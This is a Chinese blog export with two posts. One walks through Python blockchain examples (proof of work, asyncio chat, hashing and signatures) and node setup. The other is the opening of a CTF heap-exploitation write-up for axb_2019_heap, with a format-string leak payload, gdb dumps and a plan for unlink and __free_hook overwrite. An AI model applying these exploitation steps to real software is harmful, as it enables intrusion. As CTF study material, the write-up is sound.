<h4 id="example-1"><a href="#example-1" class="headerlink" title="example"></a>example</h4><h5 id="1-easy"><a href="#1-easy" class="headerlink" title="1 easy"></a>1 easy</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"></span><br><span class="line">x = <span class="number">5</span></span><br><span class="line">y = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> sha256(<span class="string">f'<span class="subst">&#123;x*y&#125;</span>'</span>.encode()).hexdigest()[<span class="number">-1</span>] != <span class="string">"0"</span>:</span><br><span class="line">	y += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">f'The solution is y = <span class="subst">&#123;y&#125;</span>'</span>)(funcoin-fVGYERd1-py3<span class="number">.8</span>)</span><br></pre></td></tr></table></figure>
<p><img src="/2021/08/07/23-59/image-20210731170111573.png" alt="image-20210731170111573"></p>
<h5 id="2-应用到blockchain"><a href="#2-应用到blockchain" class="headerlink" title="2 应用到blockchain"></a>2 应用到blockchain</h5><blockquote>
<p>代码同chapter3</p>
</blockquote>
<p><img src="/2021/08/07/23-59/image-20210731170314488.png" alt="image-20210731170314488"></p>
<h2 id="chapter-5"><a href="#chapter-5" class="headerlink" title="chapter 5"></a>chapter 5</h2><blockquote>
<p>讲的网络，首先讲了异步，然后做了一个简单的聊天，类似于区块链中的通信情况。</p>
</blockquote>
<h3 id="异步"><a href="#异步" class="headerlink" title="异步"></a>异步</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">greet</span><span class="params">(name,delay)</span>:</span></span><br><span class="line">	<span class="keyword">await</span> asyncio.sleep(delay)</span><br><span class="line">	print(<span class="string">f'<span class="subst">&#123;name&#125;</span>:I waited <span class="subst">&#123;delay&#125;</span> seconds before saying "hello"'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">	task_1 = asyncio.create_task(greet(<span class="string">"t1"</span>,<span class="number">3</span>))</span><br><span class="line">	task_2 = asyncio.create_task(greet(<span class="string">"t2"</span>,<span class="number">2</span>))</span><br><span class="line">	task_3 = asyncio.create_task(greet(<span class="string">"t3"</span>,<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">	start_time = time.time()</span><br><span class="line">	print(<span class="string">"0.00s: Program Start"</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">await</span> task_1</span><br><span class="line">	<span class="keyword">await</span> task_2</span><br><span class="line">	<span class="keyword">await</span> task_3</span><br><span class="line"></span><br><span class="line">	print(<span class="string">f"<span class="subst">&#123;time.time() - start_time:<span class="number">.2</span>f&#125;</span>s: Program End"</span>)</span><br><span class="line"></span><br><span class="line">asyncio.run(main())</span><br></pre></td></tr></table></figure>
<p><img src="/2021/08/07/23-59/image-20210731171321116.png" alt="image-20210731171321116"></p>
<h3 id="简易聊天系统"><a href="#简易聊天系统" class="headerlink" title="简易聊天系统"></a>简易聊天系统</h3><p>构造一个通信，类似于区块链的通信</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">from</span> textwrap <span class="keyword">import</span> dedent</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ConnectionPool</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.connection_pool = set()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">send_welcome_message</span><span class="params">(self,writer)</span>:</span></span><br><span class="line">        message = dedent(<span class="string">f"""</span></span><br><span class="line"><span class="string">        ===</span></span><br><span class="line"><span class="string">        Welcome <span class="subst">&#123;writer.nickname&#125;</span>!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        There are <span class="subst">&#123;len(self.connection_pool) - <span class="number">1</span>&#125;</span> user(s) here beside you</span></span><br><span class="line"><span class="string">       </span></span><br><span class="line"><span class="string">        Help:</span></span><br><span class="line"><span class="string">         - Type anything to chat</span></span><br><span class="line"><span class="string">         - /list will list all the connected users</span></span><br><span class="line"><span class="string">         - /quit will disconnect you</span></span><br><span class="line"><span class="string">        ===</span></span><br><span class="line"><span class="string">        """</span>)</span><br><span class="line"></span><br><span class="line">        writer.write(<span class="string">f"<span class="subst">&#123;message&#125;</span>/n"</span>.encode())</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">broadcast</span><span class="params">(self,writer,message)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> user <span class="keyword">in</span> self.connection_pool:</span><br><span class="line">            <span class="keyword">if</span> user != writer:</span><br><span class="line">                <span class="comment"># We don't need to also broadcast to the user sending the message</span></span><br><span class="line">                user.write(<span class="string">f"<span class="subst">&#123;message&#125;</span>/n"</span>.encode())</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">broadcast_user_join</span><span class="params">(self,writer)</span>:</span></span><br><span class="line">        self.broadcast(writer,<span class="string">f"<span class="subst">&#123;writer.nickname&#125;</span> just joined"</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">broadcast_user_quit</span><span class="params">(self,writer)</span>:</span></span><br><span class="line">        self.broadcast(writer,<span class="string">f"<span class="subst">&#123;writer.nickname&#125;</span> just quit"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">broadcast_new_message</span><span class="params">(self,writer,message)</span>:</span></span><br><span class="line">        self.broadcast(writer,<span class="string">f"[<span class="subst">&#123;writer.nickname&#125;</span>] <span class="subst">&#123;message&#125;</span>"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">list_users</span><span class="params">(self,writer)</span>:</span></span><br><span class="line">        message = <span class="string">"===/n"</span></span><br><span class="line">        message += <span class="string">"Currently connected users:"</span></span><br><span class="line">        <span class="keyword">for</span> user <span class="keyword">in</span> self.connection_pool:</span><br><span class="line">            <span class="keyword">if</span> user == writer:</span><br><span class="line">                message += <span class="string">f"/n - <span class="subst">&#123;user.nickname&#125;</span> (you)"</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                message += <span class="string">f"/n - <span class="subst">&#123;user.nickname&#125;</span>"</span></span><br><span class="line"></span><br><span class="line">        message += <span class="string">"/n==="</span></span><br><span class="line">        writer.write(<span class="string">f"<span class="subst">&#123;message&#125;</span>/n"</span>.encode())</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">add_new_user_to_pool</span><span class="params">(self, writer)</span>:</span></span><br><span class="line">        self.connection_pool.add(writer)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">remove_user_from_pool</span><span class="params">(self,writer)</span>:</span></span><br><span class="line">        self.connection_pool.remove(writer)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">handle_connection</span><span class="params">(reader,writer)</span>:</span></span><br><span class="line">    <span class="comment"># Get a nickname for the new client</span></span><br><span class="line">    writer.write(<span class="string">"&gt; Choose your nickname: "</span>.encode())</span><br><span class="line"></span><br><span class="line">    response = <span class="keyword">await</span> reader.readuntil(<span class="string">b"/n"</span>)</span><br><span class="line">    writer.nickname = response.decode().strip()</span><br><span class="line"></span><br><span class="line">    connection_pool.add_new_user_to_pool(writer)</span><br><span class="line">    connection_pool.send_welcome_message(writer)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Announce the arrival of this new user</span></span><br><span class="line">    connection_pool.broadcast_user_join(writer)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = <span class="keyword">await</span> reader.readuntil(<span class="string">b"/n"</span>)</span><br><span class="line">        <span class="keyword">except</span> asyncio.exceptions.IncompleteReadError:</span><br><span class="line">            connection_pool.broadcast_user_quit(writer)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        message = data.decode().strip()</span><br><span class="line">        <span class="keyword">if</span> message == <span class="string">"/quit"</span>:</span><br><span class="line">            connection_pool.broadcast_user_quit(writer)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> message == <span class="string">"/list"</span>:</span><br><span class="line">            connection_pool.list_users(writer)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            connection_pool.broadcast_new_message(writer,message)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">await</span> writer.drain()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> writer.is_closing():</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># We're new outside the message loop, and the user has quit.Let's clean up...</span></span><br><span class="line">    writer.close()</span><br><span class="line">    <span class="keyword">await</span> writer.wait_closed()</span><br><span class="line">    connection_pool.remove_user_from_pool(writer)</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    server = <span class="keyword">await</span> asyncio.start_server(handle_connection,<span class="string">"0.0.0.0"</span>,<span class="number">8888</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">with</span> server:</span><br><span class="line">        <span class="keyword">await</span> server.serve_forever()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">connection_pool = ConnectionPool()</span><br><span class="line">asyncio.run(main())</span><br></pre></td></tr></table></figure>
<p><img src="/2021/08/07/23-59/image-20210731171000653.png" alt="image-20210731171000653"></p>
<p><img src="/2021/08/07/23-59/image-20210731171014807.png" alt="image-20210731171014807"></p>
<p><img src="/2021/08/07/23-59/image-20210731171025014.png" alt="image-20210731171025014"></p>
<p><img src="/2021/08/07/23-59/image-20210731171036384.png" alt="image-20210731171036384"></p>
<h2 id="chapter-6"><a href="#chapter-6" class="headerlink" title="chapter 6"></a>chapter 6</h2><blockquote>
<p>加密</p>
</blockquote>
<h3 id="example-2"><a href="#example-2" class="headerlink" title="example"></a>example</h3><h4 id="1-验证数据完整"><a href="#1-验证数据完整" class="headerlink" title="1 验证数据完整"></a>1 验证数据完整</h4><blockquote>
<p>发送的时候，把原文和sha256加密的东西一起发送过去</p>
<p>验证的时候，对数据sha256，对比值是否相等</p>
</blockquote>
<p>alice发生数据给bob</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line">message = <span class="string">"Hello Bob, Let's meet at the Kruger National Park on 2020-12-12 at 1pm."</span></span><br><span class="line">hash_message = sha256((<span class="string">"p@55w0rd"</span> + message).encode()).hexdigest()</span><br><span class="line">print(hash_message)</span><br></pre></td></tr></table></figure>
<p>bob验证数据未被修改</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line">alices_message = <span class="string">"Hello Bob, Let's meet at the Kruger National Park on 2020-12-12 at 1pm."</span></span><br><span class="line">alices_hash = <span class="string">"39aae6ffdb3c0ac1c1cc0f50bf08871a729052cf1133c4c9b44a5bab8fb66211"</span></span><br><span class="line">hash_message = sha256((<span class="string">"p@55w0rd"</span> + alices_message).encode()).hexdigest()</span><br><span class="line"><span class="keyword">if</span> hash_message == alices_hash:</span><br><span class="line">    print(<span class="string">"Message has not been tampered with"</span>)</span><br></pre></td></tr></table></figure>
<p><img src="/2021/08/07/23-59/image-20210731171637680.png" alt="image-20210731171637680"></p>
<h4 id="2-加密传送数据"><a href="#2-加密传送数据" class="headerlink" title="2 加密传送数据"></a>2 加密传送数据</h4><blockquote>
<p>发送数据：</p>
<ul>
<li>公钥发送</li>
<li>私钥对数据签名</li>
</ul>
<p>接收</p>
<p>verify验证</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> nacl.encoding</span><br><span class="line"><span class="keyword">import</span> nacl.signing</span><br><span class="line"></span><br><span class="line"><span class="comment">#Generate a new key-pair for Bob</span></span><br><span class="line">bobs_private_key = nacl.signing.SigningKey.generate()</span><br><span class="line">bobs_public_key = bobs_private_key.verify_key</span><br><span class="line">print(bobs_public_key)</span><br><span class="line"></span><br><span class="line"><span class="comment">#Since it's bytes,we'll need to serialize the key to a readable format before publishing it:</span></span><br><span class="line">bobs_public_key_hex = bobs_public_key.encode(encoder=nacl.encoding.HexEncoder)</span><br><span class="line">print(<span class="string">"/n/n"</span>)</span><br><span class="line">print(bobs_public_key_hex)</span><br><span class="line"><span class="comment">#Now,Let's sign a message with it</span></span><br><span class="line">signed = bobs_private_key.sign(<span class="string">b"Send $37 to Alice"</span>)</span><br><span class="line">print(<span class="string">"/n/n"</span>)</span><br><span class="line">print(signed)</span><br></pre></td></tr></table></figure>
<p><img src="/2021/08/07/23-59/image-20210731171918053.png" alt="image-20210731171918053"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> nacl.encoding</span><br><span class="line"><span class="keyword">import</span> nacl.signing</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># From the above example...</span></span><br><span class="line">bobs_public_key = <span class="string">'acc5cc1750b841f0b383e5f620282946476c37d602c42b9dbaccb9db758b728e'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># We generate the verify_key</span></span><br><span class="line">verify_key = nacl.signing.VerifyKey(bobs_public_key,encoder=nacl.encoding.HexEncoder)</span><br><span class="line"></span><br><span class="line">signed_message = <span class="string">b"/x8b/x08/x93/xb0/xda!r)/x19i/x18d/xe0/xbbi/x8a@c/xf8-/x8e/xbdr/xb7/xe8%/x0eez/x99/xd2/x0c/xc8/x14_/x8d/x02zWV/x8e/x81/xfb[9/x9b/x9d/x1b/xbb/xda/xe7/x05/x945/xc2/xef~/x17/x90/xfd3'/xc3/x00Send $37 to Alice"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Now we attempt to verify the message</span></span><br><span class="line"><span class="comment"># Any invalidation will result in an Exception being thrown</span></span><br><span class="line">verify_key.verify(signed_message)</span><br></pre></td></tr></table></figure>
<p><img src="/2021/08/07/23-59/image-20210731172022526.png" alt="image-20210731172022526"></p>
<p>如果修改bobs_public_key/signed_message为错误的，则</p>
<p><img src="/2021/08/07/23-59/image-20210731172057501.png" alt="image-20210731172057501"></p>
<h2 id="chapter-7"><a href="#chapter-7" class="headerlink" title="chapter 7"></a>chapter 7</h2><blockquote>
<p>整合</p>
</blockquote>
<p><img src="/2021/08/07/23-59/image-20210731172254999.png" alt="image-20210731172254999"></p>
<h1 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h1><h2 id="0-完整代码"><a href="#0-完整代码" class="headerlink" title="0 完整代码"></a>0 完整代码</h2><p>链接：<a href="https://github.com/dvf/blockchain" target="_blank" rel="noopener">https://github.com/dvf/blockchain</a></p>
<p><img src="/2021/08/07/23-59/image-20210807173529463.png" alt="image-20210807173529463"></p>
<h2 id="1-工具安装"><a href="#1-工具安装" class="headerlink" title="1 工具安装"></a>1 工具安装</h2><p>安装python（版本3.8）和poetry</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ sudo apt-get update</span><br><span class="line">$ sudo apt-get install python3.8</span><br><span class="line">#ln -s 把python3和python3.8链接</span><br><span class="line"></span><br><span class="line">$ curl -sSL https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;sdispater&#x2F;poetry&#x2F;master&#x2F;get-poetry.py | python</span><br><span class="line"></span><br><span class="line">#安装依赖</span><br><span class="line">poetry add pynacl structlog colorama marshmallow marshmallow-oneofschema aiohttp</span><br><span class="line"></span><br><span class="line">pip install pipenv </span><br><span class="line">pipenv install </span><br><span class="line">pip install Flask&#x3D;&#x3D;0.12.2 requests&#x3D;&#x3D;2.18.4</span><br></pre></td></tr></table></figure>
<h2 id="1启动节点"><a href="#1启动节点" class="headerlink" title="1启动节点"></a>1启动节点</h2><p>代码下载后放到服务器上，启动节点</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ pipenv run python blockchain.py			#默认启动端口5000，启动5000端口的节点</span><br><span class="line">$ pipenv run python blockchain.py -p 5001</span><br><span class="line">$ pipenv run python blockchain.py --port 5002</span><br></pre></td></tr></table></figure>
<p><img src="/2021/08/07/23-59/image-20210807171341824.png" alt="image-20210807171341824"></p>
<h2 id="2-使用"><a href="#2-使用" class="headerlink" title="2 使用"></a>2 使用</h2><h3 id="访问"><a href="#访问" class="headerlink" title="访问"></a>访问</h3><p>访问区块链</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#ip:port&#x2F;chain 可以访问区块链</span><br><span class="line">http:&#x2F;&#x2F;156.233.254.97:5002&#x2F;chain</span><br></pre></td></tr></table></figure>
<p><img src="/2021/08/07/23-59/image-20210807171442690.png" alt="image-20210807171442690"></p>
<h3 id="挖矿"><a href="#挖矿" class="headerlink" title="挖矿"></a>挖矿</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#ip:port&#x2F;mine</span><br><span class="line">http:&#x2F;&#x2F;156.233.254.97:5002&#x2F;mine</span><br></pre></td></tr></table></figure>
<p><img src="/2021/08/07/23-59/image-20210807171527803.png" alt="image-20210807171527803"></p>
<p><img src="/2021/08/07/23-59/image-20210807171542372.png" alt="image-20210807171542372" style="zoom:67%;"></p>
<h3 id="创建交易"><a href="#创建交易" class="headerlink" title="创建交易"></a>创建交易</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -X POST -H &quot;Content-Type: application&#x2F;json&quot; -d &#39;&#123;</span><br><span class="line"> &quot;sender&quot;: &quot;d4ee26eee15148ee92c6cd394edd974e&quot;,</span><br><span class="line"> &quot;recipient&quot;: &quot;someone-other-address&quot;,</span><br><span class="line"> &quot;amount&quot;: 1234</span><br><span class="line">&#125;&#39; &quot;http:&#x2F;&#x2F;156.233.254.97:5004&#x2F;transactions&#x2F;new&quot;</span><br><span class="line"></span><br><span class="line">curl -X POST -H &quot;Content-Type: application&#x2F;json&quot; -d &#39;&#123;</span><br><span class="line"> &quot;sender&quot;: &quot;d4ee26eee15148ee92c6cd394edd974e&quot;,</span><br><span class="line"> &quot;recipient&quot;: &quot;someone-other-address&quot;,</span><br><span class="line"> &quot;amount&quot;: 7979</span><br><span class="line">&#125;&#39; &quot;http:&#x2F;&#x2F;156.233.254.97:5002&#x2F;transactions&#x2F;new&quot;</span><br></pre></td></tr></table></figure>
<p><img src="/2021/08/07/23-59/image-20210807171921098.png" alt="image-20210807171921098"></p>
<p><img src="/2021/08/07/23-59/image-20210807172056677.png" alt="image-20210807172056677"></p>
<h3 id="共识机制"><a href="#共识机制" class="headerlink" title="共识机制"></a>共识机制</h3><p>5002端口里面有三个块</p>
<p>5003端口开一个，只有一个初始块</p>
<p><img src="/2021/08/07/23-59/image-20210807172258623.png" alt="image-20210807172258623"></p>
<p>将2注册到3上，让5003知道有5002这个节点</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -X POST -H &quot;Content-Type: application&#x2F;json&quot; -d &#39;&#123;</span><br><span class="line">	&quot;nodes&quot;:[&quot;156.233.254.97:5002&quot;]</span><br><span class="line">&#125;&#39; &quot;http:&#x2F;&#x2F;156.233.254.97:5003&#x2F;nodes&#x2F;register&quot;</span><br><span class="line"></span><br><span class="line">curl -X POST -H &quot;Content-Type: application&#x2F;json&quot; -d &#39;&#123;</span><br><span class="line">	&quot;nodes&quot;:[&quot;156.233.254.97:5004&quot;]</span><br><span class="line">&#125;&#39; &quot;http:&#x2F;&#x2F;156.233.254.97:5005&#x2F;nodes&#x2F;register&quot;</span><br></pre></td></tr></table></figure>
<p><img src="/2021/08/07/23-59/image-20210807172505247.png" alt="image-20210807172505247"></p>
<p>通过共识，5003更新节点跟5002一样</p>
<p><img src="/2021/08/07/23-59/image-20210807172558767.png" alt="image-20210807172558767"></p>
<p><img src="/2021/08/07/23-59/image-20210807172613733.png" alt="image-20210807172613733"></p>
]]></content>
      <categories>
        <category>blockchain</category>
      </categories>
      <tags>
        <tag>book</tag>
      </tags>
  </entry>
  <entry>
    <title>axb_2019_heap详解</title>
    <url>/2021/04/25/15-11/</url>
    <content><![CDATA[<blockquote>
<p>关于axb_2019_heap的详解</p>
<p>参考：<a href="https://blog.csdn.net/weixin_45677731/article/details/108763362" target="_blank" rel="noopener">buuctf  axb_2019_heap</a></p>
</blockquote>
<h3 id="程序流程"><a href="#程序流程" class="headerlink" title="程序流程"></a>程序流程</h3><ol>
<li><p>banner：存在格式化字符串漏洞，可以泄漏栈上的信息</p>
</li>
<li><p>add：根据idx创建size（大于0x80）大小的内容为content的块</p>
<p>块指针和块大小存放在一个全局变量note中</p>
</li>
<li><p>delete：释放的很干净，没有uaf</p>
</li>
<li><p>edit：存在off by one</p>
<p><code>get_input(*((_QWORD *)&amp;note + 2 * v1), *((_DWORD *)&amp;note + 4 * v1 + 2));</code></p>
<p><code>if ( a2 + 1 &lt;= (unsigned int)v3 )</code>v3是以及输入的长度，a2是给定的长度，存在一个字节的溢出</p>
</li>
</ol>
<h4 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h4><blockquote>
<p>这个程序没有保留调试信息，不能调试，只能一步步看，，，</p>
<p><a href="https://www.yanbinghu.com/2019/04/20/41283.html" target="_blank" rel="noopener">GDB调试指南</a></p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Reading symbols from axb_2019_heap...(no debugging symbols found)...done.</span><br></pre></td></tr></table></figure>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><ol>
<li><p>利用格式化字符串泄露栈上信息</p>
<ul>
<li><p><code>__libc_start_main+240</code> =&gt; libc基地址</p>
</li>
<li><p>(main) ◂— push   rbp =&gt; 程序基地址</p>
</li>
</ul>
</li>
<li><p>由于存在全局变量note，故可以利用unlink控制chunk指针</p>
</li>
<li><p>修改__free_hook为system，get shell</p>
</li>
</ol>
<h3 id="详细过程"><a href="#详细过程" class="headerlink" title="详细过程"></a>详细过程</h3><h4 id="1-格式化字符串"><a href="#1-格式化字符串" class="headerlink" title="1.格式化字符串"></a>1.格式化字符串</h4><blockquote>
<p>计算偏移：直接算或者用工具 =&gt; 得到偏移为7</p>
</blockquote>
<p><img src="/2021/04/25/15-11/image-20210425142716133.png" alt="image-20210425142716133"></p>
<blockquote>
<p>执行到<code>printf(&amp;format);</code></p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">► 0x555555554b4e &lt;banner+105&gt;    call   printf@plt &lt;printf@plt&gt;</span><br><span class="line">       format: 0x7fffffffde4c ◂— &#39;aaaaaaaa&#39;</span><br><span class="line">       vararg: 0x7fffffffb7b0 ◂— &#39;Hello, our name:&#39;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; stack 30</span><br><span class="line">00:0000│ rsp    0x7fffffffde40 ◂— 0x0</span><br><span class="line">01:0008│ rdi-4  0x7fffffffde48 ◂— 0x61616161ffffde60</span><br><span class="line">02:0010│        0x7fffffffde50 ◂— 0x550061616161 &#x2F;* &#39;aaaa&#39; *&#x2F;	#输入的数据</span><br><span class="line">03:0018│        0x7fffffffde58 ◂— 0xd23db0a55446d00</span><br><span class="line">04:0020│ rbp    0x7fffffffde60 —▸ 0x7fffffffde80 —▸ 0x555555555200 (__libc_csu_init) ◂— push   r15</span><br><span class="line">05:0028│        0x7fffffffde68 —▸ 0x555555555186 (main+28) ◂— mov    eax, 0</span><br><span class="line">06:0030│        0x7fffffffde70 —▸ 0x7fffffffdf60 ◂— 0x1</span><br><span class="line">07:0038│        0x7fffffffde78 ◂— 0x0</span><br><span class="line">08:0040│        0x7fffffffde80 —▸ 0x555555555200 (__libc_csu_init) ◂— push   r15</span><br><span class="line">09:0048│        0x7fffffffde88 —▸ 0x7ffff7a2d840 (__libc_start_main+240) ◂— mov    edi, eax	#可以泄露libc_base</span><br><span class="line">0a:0050│        0x7fffffffde90 ◂— 0x1</span><br><span class="line">0b:0058│        0x7fffffffde98 —▸ 0x7fffffffdf68 —▸ 0x7fffffffe2d3 ◂— &#39;&#x2F;home&#x2F;winter&#x2F;buu&#x2F;axb_2019_heap&#39;</span><br><span class="line">0c:0060│        0x7fffffffdea0 ◂— 0x1f7ffcca0</span><br><span class="line">0d:0068│        0x7fffffffdea8 —▸ 0x55555555516a (main) ◂— push   rbp	#main起始地址，可以泄露程序基地址</span><br></pre></td></tr></table></figure>
<p>所以<code>__libc_start_main+240</code>的偏移为15，<code>main</code>的偏移为19。</p>
<p>通过计算即可得到libc_base和程序基地址（开启了pie，每次都不一样）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p.recvuntil(<span class="string">"Enter your name: "</span>)</span><br><span class="line">payload = <span class="string">"%15$p.%19$p"</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">main_240 = int(p.recvuntil(<span class="string">"."</span>)[<span class="number">-13</span>:<span class="number">-1</span>],<span class="number">16</span>)</span><br><span class="line">push_rbp = int(p.recvuntil(<span class="string">"\n"</span>)[<span class="number">-13</span>:],<span class="number">16</span>)</span><br><span class="line">print(hex(main_240))</span><br><span class="line">print(hex(push_rbp))</span><br><span class="line"></span><br><span class="line">libc_base = main_240 - libc.sym[<span class="string">'__libc_start_main'</span>] - <span class="number">240</span></span><br><span class="line">pro_base = push_rbp - <span class="number">0x116a</span></span><br><span class="line">log.success(hex(libc_base))</span><br><span class="line">log.success(hex(pro_base))</span><br></pre></td></tr></table></figure>
<h4 id="2-unlink"><a href="#2-unlink" class="headerlink" title="2.unlink"></a>2.unlink</h4><blockquote>
<p>首先计算note地址 = 程序基地址 + note偏移 =&gt; <code>note = pro_base + 0x0202060</code></p>
<p>接着申请三个块，0x98大小（方便修改下一个chunk）</p>
<ul>
<li>第一个chunk：构造fake chunk</li>
<li>第二个chunk：用于释放，unlink</li>
<li>第三个chunk：防止第二个chunk和top chunk合并</li>
</ul>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55830d656000</span><br><span class="line">Size: 0xa1</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55830d6560a0</span><br><span class="line">Size: 0xa1</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55830d656140</span><br><span class="line">Size: 0xa1</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55830d6561e0</span><br><span class="line">Size: 0x20e21</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;50gx 0x55830d656000</span><br><span class="line">0x55830d656000:	0x0000000000000000	0x00000000000000a1</span><br><span class="line">0x55830d656010:	0x0000000061616161	0x0000000000000000</span><br><span class="line">0x55830d656020:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55830d656030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55830d656040:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55830d656050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55830d656060:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55830d656070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55830d656080:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55830d656090:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55830d6560a0:	0x0000000000000000	0x00000000000000a1</span><br><span class="line">0x55830d6560b0:	0x0000000062626262	0x0000000000000000</span><br><span class="line">0x55830d6560c0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x55830ca49060</span><br><span class="line">0x55830ca49060 &lt;note&gt;:	0x000055830d656010	0x0000000000000098</span><br><span class="line">0x55830ca49070 &lt;note+16&gt;:	0x000055830d6560b0	0x0000000000000098</span><br><span class="line">0x55830ca49080 &lt;note+32&gt;:	0x000055830d656150	0x0000000000000098</span><br><span class="line">0x55830ca49090 &lt;note+48&gt;:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">add(0,0x98,&#39;aaaa&#39;)</span><br><span class="line">add(1,0x98,&#39;bbbb&#39;)</span><br><span class="line">add(2,0x98,&#39;cccc&#39;)</span><br></pre></td></tr></table></figure>
<blockquote>
<p> 通过第一个chunk构造，并off by one修改第二个chunk的大小。</p>
</blockquote>
